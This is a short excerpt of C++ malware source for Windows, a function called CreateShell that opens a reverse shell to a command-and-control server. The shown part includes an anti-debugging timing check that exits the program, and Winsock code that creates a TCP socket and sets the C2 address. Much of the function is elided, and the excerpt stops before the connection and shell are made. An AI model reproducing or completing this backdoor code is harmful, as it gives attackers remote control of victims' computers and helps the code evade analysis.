...
void CreateShell(char* C2Server, int C2Port, int t1) {
    ...
    while (true) {
        ...
        if (((t2 - t1) / 1000) > 10) exit(0); //debug check 

        SOCKET mySocket;
        sockaddr_in addr; 
        WSADATA version;
        WSAStartup(MAKEWORD(2, 2), &version);
        mySocket = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;

        //addr.sin_addr.s_addr = inet_addr(C2Server);  //IP received from main function
        InetPton(AF_INET, C2Server, &addr.sin_addr.s_addr);
